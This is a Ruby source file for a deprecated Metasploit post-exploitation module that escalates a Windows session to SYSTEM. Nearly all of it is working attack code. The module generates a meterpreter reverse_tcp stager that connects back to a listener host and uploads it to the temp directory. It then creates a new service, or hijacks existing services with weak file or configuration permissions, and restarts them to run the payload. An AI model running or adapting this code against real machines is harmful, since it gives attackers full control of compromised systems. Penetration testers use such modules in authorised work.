##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/services'
require 'rex'

class Metasploit3 < Msf::Post

	require 'msf/core/module/deprecated'
	include Msf::Module::Deprecated
	deprecated Date.new(2013,1,10), "exploit/windows/local/service_permissions"

	include ::Msf::Post::Windows::Services
	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Escalate Service Permissions Local Privilege Escalation',
			'Description'   => %q{
				This module attempts to exploit existing administrative privileges to obtain
				a SYSTEM session. If directly creating a service fails, this module will inspect
				existing services to look for insecure file or configuration permissions that may
				be hijacked. It will then attempt to restart the replaced service to run the
				payload. This will result in a new session when this succeeds. If the module is
				able to modify the service but does not have permission to start and stop the
				affected service, the attacker must wait for the system to restart before a
				session will be created.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'scriptjunkie' ],
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options([
			OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
			OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
			OptString.new("PAYLOAD",  [ false, "Windows Payload to use.", "windows/meterpreter/reverse_tcp" ]),
			OptBool.new("AGGRESSIVE", [ false, "Exploit as many services as possible (dangerous)", false ])
		])

	end

	def run
		print_status("running")

		lhost = datastore["LHOST"] || Rex::Socket.source_address
		lport = datastore["LPORT"] || 4444
		payload = datastore['PAYLOAD'] || "windows/meterpreter/reverse_tcp"

		# create a session handler
		handler = session.framework.exploits.create("multi/handler")
		handler.register_parent(self)
		handler.datastore['PAYLOAD'] = payload
		handler.datastore['LHOST']   = lhost
		handler.datastore['LPORT']   = lport
		handler.datastore['InitialAutoRunScript'] = "migrate -f"
		handler.datastore['ExitOnSession'] = true
		handler.datastore['ListenerTimeout'] = 300
		handler.datastore['ListenerComm'] = 'local'

		# start the session handler

		#handler.exploit_module = self
		handler.exploit_simple(
			'LocalInput'  => self.user_input,
			'LocalOutput' => self.user_output,
			'Payload'  => handler.datastore['PAYLOAD'],
			'RunAsJob' => true
		)

		# randomize the filename
		filename= Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

		# randomize the exe name
		tempexe_name = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

		# generate a payload
		pay = session.framework.payloads.create(payload)
		pay.datastore['LHOST'] = lhost
		pay.datastore['LPORT'] = lport

		raw = pay.generate

		if pay.arch.join == "x86"
			exe = Msf::Util::EXE.to_win32pe_service(session.framework, raw)
		else
			exe = Msf::Util::EXE.to_win64pe_service(session.framework, raw)
		end

		sysdir = session.fs.file.expand_path("%SystemRoot%")
		tmpdir = session.fs.file.expand_path("%TEMP%")

		begin
			print_status("Meterpreter stager executable #{exe.length} bytes long being uploaded..")
			#
			# Upload the payload to the filesystem
			#
			tempexe = tmpdir + "\\" + tempexe_name
			fd = client.fs.file.new(tempexe, "wb")
			fd.write(exe)
			fd.close
		rescue ::Exception => e
			print_error("Error uploading file #{filename}: #{e.class} #{e}")
			return
		end

		#attempt to make new service

		#SERVICE_NO_CHANGE 0xffffffff for DWORDS or NULL for pointer values leaves the current config

		print_status("Trying to add a new service...")
		adv = client.railgun.advapi32
		manag = adv.OpenSCManagerA(nil,nil,0x10013)
		if(manag["return"] != 0)
			# SC_MANAGER_CREATE_SERVICE = 0x0002
			# SERVICE_START=0x0010  SERVICE_WIN32_OWN_PROCESS= 0X00000010
			# SERVICE_AUTO_START = 2 SERVICE_ERROR_IGNORE = 0
			newservice = adv.CreateServiceA(manag["return"],Rex::Text.rand_text_alpha((rand(8)+6)),
				"",0x0010,0X00000010,2,0,tempexe,nil,nil,nil,nil,nil)
			if(newservice["return"] != 0)
				print_status("Created service... #{newservice["return"]}")
				ret = adv.StartServiceA(newservice["return"], 0, nil)
				print_status("Service should be started! Enjoy your new SYSTEM meterpreter session.")
				adv.DeleteService(newservice["return"])
				adv.CloseServiceHandle(newservice["return"])
				if datastore['AGGRESSIVE'] != true
					adv.CloseServiceHandle(manag["return"])
					return
				end
			else
				print_error("Uhoh. service creation failed, but we should have the permissions. :-(")
			end
		else
			print_status("No privs to create a service...")
			manag = adv.OpenSCManagerA(nil,nil,1)
			if(manag["return"] == 0)
				print_status("Cannot open sc manager. You must have no privs at all. Ridiculous.")
			end
		end
		print_status("Trying to find weak permissions in existing services..")
		#Search through list of services to find weak permissions, whether file or config
		serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
		#for each service
		service_list.each do |serv|
			begin
				srvtype = registry_getvaldata("#{serviceskey}\\#{serv}","Type").to_s
				if srvtype != "16"
					continue
				end
				moved = false
				configed = false
				#default path, but there should be an ImagePath registry key
				source = client.fs.file.expand_path("%SYSTEMROOT%\\system32\\#{serv}.exe")
				#get path to exe; parse out quotes and arguments
				sourceorig = registry_getvaldata("#{serviceskey}\\#{serv}","ImagePath").to_s
				sourcemaybe = client.fs.file.expand_path(sourceorig)
				if( sourcemaybe[0] == '"' )
					sourcemaybe = sourcemaybe.split('"')[1]
				else
					sourcemaybe = sourcemaybe.split(' ')[0]
				end
				begin
					client.fs.file.stat(sourcemaybe) #check if it really exists
					source = sourcemaybe
				rescue
					print_status("Cannot reliably determine path for #{serv} executable. Trying #{source}")
				end
				#try to exploit weak file permissions
				if(source != tempexe && client.railgun.kernel32.MoveFileA(source, source+'.bak')["return"])
					client.railgun.kernel32.CopyFileA(tempexe, source, false)
					print_status("#{serv} has weak file permissions - #{source} moved to #{source+'.bak'} and replaced.")
					moved = true
				end
				#try to exploit weak config permissions
				#open with SERVICE_CHANGE_CONFIG (0x0002)
				servhandleret = adv.OpenServiceA(manag["return"],serv,2)
				if(servhandleret["return"] != 0)
					#SERVICE_NO_CHANGE is  0xFFFFFFFF
					if(adv.ChangeServiceConfigA(servhandleret["return"],0xFFFFFFFF,
							0xFFFFFFFF,0xFFFFFFFF,tempexe,nil,nil,nil,nil,nil,nil))
						print_status("#{serv} has weak configuration permissions - reconfigured to use exe #{tempexe}.")
						configed = true
					end
					adv.CloseServiceHandle(servhandleret["return"])

				end
				if(moved != true && configed != true)
					print_status("No exploitable weak permissions found on #{serv}")
					continue
				end
				print_status("Restarting #{serv}")
				#open with  SERVICE_START (0x0010) and SERVICE_STOP (0x0020)
				servhandleret = adv.OpenServiceA(manag["return"],serv,0x30)
				if(servhandleret["return"] != 0)
					#SERVICE_CONTROL_STOP = 0x00000001
					if(adv.ControlService(servhandleret["return"],1,56))
						client.railgun.kernel32.Sleep(1000)
						adv.StartServiceA(servhandleret["return"],0,nil)
						print_status("#{serv} restarted. You should get a system meterpreter soon. Enjoy.")
						#Cleanup
						if moved == true
							client.railgun.kernel32.MoveFileExA(source+'.bak', source, 1)
						end
						if configed == true
							servhandleret = adv.OpenServiceA(manag["return"],serv,2)
							adv.ChangeServiceConfigA(servhandleret["return"],0xFFFFFFFF,
									0xFFFFFFFF,0xFFFFFFFF,sourceorig,nil,nil,nil,nil,nil,nil)
							adv.CloseServiceHandle(servhandleret["return"])
						end
					else
						print_status("Could not restart #{serv}. Wait for a reboot or force one yourself.")
					end
					adv.CloseServiceHandle(servhandleret["return"])
					if datastore['AGGRESSIVE'] != true
						return
					end
				else
					print_status("Could not restart #{serv}. Wait for a reboot. (or force one yourself)")
				end
			rescue
			end
		end
	end
end
